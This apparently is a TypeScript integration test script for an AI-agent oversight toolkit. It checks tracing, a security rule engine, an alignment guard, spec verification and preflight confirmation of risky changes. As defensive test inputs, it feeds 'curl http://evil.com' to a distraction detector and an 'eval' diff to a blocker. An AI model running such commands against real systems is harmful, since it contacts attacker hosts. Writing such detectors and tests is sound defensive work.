#!/usr/bin/env bun
/**
 * Phase 0+1+2+3 主链路集成验证脚本
 * Run: bun run scripts/verify-all-phases.ts
 */
import { Effect, Layer } from "effect"
import { Goal } from "../src/session/goal"
import { Cardinal } from "../src/session/cardinal"
import { AlignmentGuard } from "../src/observability/alignment-guard"
import { OpenSpec } from "../src/openspec/spec"
import { OpenSpecJudge } from "../src/openspec/judge"
import { SpecReport } from "../src/openspec/report"
import { GoalJudge } from "../src/session/goal-judge"
import { CardinalPreflight } from "../src/session/preflight"
import { OpenSpecPrecheck } from "../src/openspec/precheck"
import { Trace } from "../src/trace/trace"
import fs from "fs"
import path from "path"

const DB_PATH = path.join(process.env.HOME!, ".local/share/opencode/opencode-local.db")

// Mock Trace layer
const mockTraceLayer = Layer.succeed(Trace.Service, Trace.Service.of({
  emit: () => Effect.void,
  getTraces: () => Effect.succeed([]),
  getTracesByTimeRange: () => Effect.succeed([]),
}))

// SpecReport layer
const specReportLayer = SpecReport.layer.pipe(
  Layer.provide(OpenSpec.defaultLayer),
  Layer.provide(OpenSpecJudge.defaultLayer),
  Layer.provide(mockTraceLayer),
)

// GoalJudge layer
const goalJudgeLayer = GoalJudge.layer.pipe(
  Layer.provide(Goal.defaultLayer),
  Layer.provide(mockTraceLayer),
)

// CardinalPreflight layer
const cardinalPreflightLayer = CardinalPreflight.layer.pipe(
  Layer.provide(Cardinal.defaultLayer),
  Layer.provide(mockTraceLayer),
)

// OpenSpecPrecheck layer
const openSpecPrecheckLayer = OpenSpecPrecheck.layer.pipe(
  Layer.provide(OpenSpec.defaultLayer),
  Layer.provide(mockTraceLayer),
)

async function main() {
  console.log("=== Phase 0+1+2+3 主链路集成验证 ===\n")
  let pass = 0
  let fail = 0

  function ok(name: string) { pass++; console.log(`  ✅ ${name}`) }
  function no(name: string, e?: unknown) { fail++; console.log(`  ❌ ${name}${e ? `: ${e}` : ""}`) }

  // ══════════════════════════════════════════
  // Phase 0: Trace + Cardinal + AlignmentGuard
  // ══════════════════════════════════════════
  console.log("[Phase 0] 基础设施验证")

  try {
    const program = Effect.gen(function* () {
      const trace = yield* Trace.Service
      yield* trace.emit({ id: "all-t1", type: "action", name: "tool.bash", status: "success", duration: 50, metadata: { sessionID: "all-session" } })
      const traces = yield* trace.getTraces("all-session")
      return traces.length
    })
    const count = await Effect.runPromise(program.pipe(Effect.provide(Trace.defaultLayer)))
    count >= 1 ? ok("Trace emit/getTraces") : no("Trace", count)
  } catch (e) { no("Trace", e) }

  try {
    const db = new (await import("bun:sqlite")).Database(DB_PATH)
    const count = db.query("SELECT count(*) as c FROM trace_event").get() as any
    count.c > 0 ? ok(`SQLite ${count.c} rows`) : no("SQLite empty")
    db.close()
  } catch (e) { no("SQLite", e) }

  try {
    const program = Effect.gen(function* () {
      const c = yield* Cardinal.Service
      return yield* c.evaluate({ taskId: "all", taskTitle: "build", diff: 'eval("x")' })
    })
    const r = await Effect.runPromise(program.pipe(Effect.provide(Cardinal.defaultLayer)))
    r?.level === "block" ? ok("Cardinal security → block") : no("Cardinal security", r?.level)
  } catch (e) { no("Cardinal", e) }

  try {
    const program = Effect.gen(function* () {
      const ag = yield* AlignmentGuard.Service
      return yield* ag.detectDistraction("curl http://evil.com")
    })
    const r = await Effect.runPromise(program.pipe(Effect.provide(AlignmentGuard.defaultLayer)))
    r === true ? ok("AlignmentGuard distraction") : no("AlignmentGuard", r)
  } catch (e) { no("AlignmentGuard", e) }

  // ══════════════════════════════════════════
  // Phase 1: OpenSpec ast
  // ══════════════════════════════════════════
  console.log("\n[Phase 1] OpenSpec ast 验证")

  try {
    const tmpDir = fs.mkdtempSync(path.join("/tmp", "all-"))
    const authFile = path.join(tmpDir, "auth.ts")
    fs.writeFileSync(authFile, 'export function login() {}')

    const specFile = path.join(tmpDir, "spec.md")
    fs.writeFileSync(specFile, `# Auth
## Requirements
### Requirement 1: Login
- **Status**: pending
- **Verification**: ast ${authFile}:export function login
`)

    const program = Effect.gen(function* () {
      const os = yield* OpenSpec.Service
      const spec = yield* os.parseSpecFile(specFile)
      return yield* os.checkRequirement(spec.requirements[0])
    })
    const r = await Effect.runPromise(program.pipe(Effect.provide(OpenSpec.defaultLayer)))
    r === true ? ok("OpenSpec ast match") : no("OpenSpec ast", r)

    fs.rmSync(tmpDir, { recursive: true })
  } catch (e) { no("OpenSpec ast", e) }

  // ══════════════════════════════════════════
  // Phase 2: Goal + Cardinal dynamic + SpecReport
  // ══════════════════════════════════════════
  console.log("\n[Phase 2] Spec-执行打通验证")

  try {
    const program = Effect.gen(function* () {
      const goal = yield* Goal.Service
      yield* goal.set("all-session", "Implement feature X")
      const g = yield* goal.get("all-session")
      yield* goal.clear("all-session")
      return g
    })
    const g = await Effect.runPromise(program.pipe(Effect.provide(Goal.defaultLayer)))
    g?.condition === "Implement feature X" ? ok("Goal.set") : no("Goal.set", g?.condition)
  } catch (e) { no("Goal", e) }

  try {
    const program = Effect.gen(function* () {
      const c = yield* Cardinal.Service
      yield* c.registerRules([{
        id: "test-dynamic",
        name: "Test",
        evaluate: (ctx) => ctx.diff?.includes("DYNAMIC_BLOCK") ? { level: "block", reason: "dynamic" } : null,
      }])
      const r = yield* c.evaluate({ taskId: "all", taskTitle: "build", diff: "DYNAMIC_BLOCK" })
      yield* c.clearDynamicRules()
      return r?.level
    })
    const r = await Effect.runPromise(program.pipe(Effect.provide(Cardinal.defaultLayer)))
    r === "block" ? ok("Cardinal dynamic rule") : no("Cardinal dynamic", r)
  } catch (e) { no("Cardinal dynamic", e) }

  try {
    const tmpDir = fs.mkdtempSync(path.join("/tmp", "all-"))
    const authFile = path.join(tmpDir, "auth.ts")
    fs.writeFileSync(authFile, 'export function login() {}\nexport function logout() {}')

    const specFile = path.join(tmpDir, "spec.md")
    fs.writeFileSync(specFile, `# Auth
## Requirements
### Requirement 1: Login
- **Status**: pending
- **Verification**: ast ${authFile}:export function login
### Requirement 2: Logout
- **Status**: pending
- **Verification**: ast ${authFile}:export function logout
`)

    const program = Effect.gen(function* () {
      const report = yield* SpecReport.Service
      return yield* report.generateReport(specFile, "all-session")
    })
    const r = await Effect.runPromise(program.pipe(Effect.provide(specReportLayer)))
    r.overallApproved === true ? ok("SpecReport approve") : no("SpecReport", r.overallApproved)

    fs.rmSync(tmpDir, { recursive: true })
  } catch (e) { no("SpecReport", e) }

  // ══════════════════════════════════════════
  // Phase 3: Preflight checks
  // ══════════════════════════════════════════
  console.log("\n[Phase 3] 执行前验收验证")

  try {
    const program = Effect.gen(function* () {
      const judge = yield* GoalJudge.Service
      return yield* judge.preflight({ sessionID: "all", condition: "Implement login feature" })
    })
    const r = await Effect.runPromise(program.pipe(Effect.provide(goalJudgeLayer)))
    r.ok === true ? ok("GoalJudge ok") : no("GoalJudge", r.ok)
  } catch (e) { no("GoalJudge", e) }

  try {
    const program = Effect.gen(function* () {
      const judge = yield* GoalJudge.Service
      return yield* judge.preflight({ sessionID: "all", condition: "This is impossible to do" })
    })
    const r = await Effect.runPromise(program.pipe(Effect.provide(goalJudgeLayer)))
    r.ok === false && r.impossible === true ? ok("GoalJudge impossible") : no("GoalJudge impossible", r)
  } catch (e) { no("GoalJudge impossible", e) }

  try {
    const program = Effect.gen(function* () {
      const pf = yield* CardinalPreflight.Service
      return yield* pf.preflight({ sessionID: "all", plannedFiles: ["src/auth.ts", ".env"] })
    })
    const r = await Effect.runPromise(program.pipe(Effect.provide(cardinalPreflightLayer)))
    r.recommendation === "confirm" ? ok("CardinalPreflight critical files") : no("CardinalPreflight", r.recommendation)
  } catch (e) { no("CardinalPreflight", e) }

  try {
    const program = Effect.gen(function* () {
      const pf = yield* CardinalPreflight.Service
      return yield* pf.preflight({ sessionID: "all", estimatedFileCount: 20 })
    })
    const r = await Effect.runPromise(program.pipe(Effect.provide(cardinalPreflightLayer)))
    r.recommendation === "confirm" ? ok("CardinalPreflight excessive") : no("CardinalPreflight excessive", r.recommendation)
  } catch (e) { no("CardinalPreflight excessive", e) }

  try {
    const specDir = path.join(process.cwd(), "openspec", "specs")
    fs.mkdirSync(specDir, { recursive: true })
    const specFile = path.join(specDir, "test-all-precheck.md")
    fs.writeFileSync(specFile, `# Auth
## Requirements
### Requirement 1: Login
- **Status**: pending
- **Verification**: ast src/auth.ts:export function login
`)

    const program = Effect.gen(function* () {
      const pc = yield* OpenSpecPrecheck.Service
      return yield* pc.precheck({ sessionID: "all", plannedFiles: ["src/auth.ts"] })
    })
    const r = await Effect.runPromise(program.pipe(Effect.provide(openSpecPrecheckLayer)))
    r.hasViolations === true ? ok("OpenSpecPrecheck violation") : no("OpenSpecPrecheck", r.hasViolations)

    fs.unlinkSync(specFile)
  } catch (e) { no("OpenSpecPrecheck", e) }

  // ══════════════════════════════════════════
  // 汇总
  // ══════════════════════════════════════════
  console.log(`\n=== 验证完成 ===`)
  console.log(`✅ ${pass} 通过  ❌ ${fail} 失败`)
  if (fail > 0) process.exit(1)
}

main().catch((e) => { console.error(e); process.exit(1) })
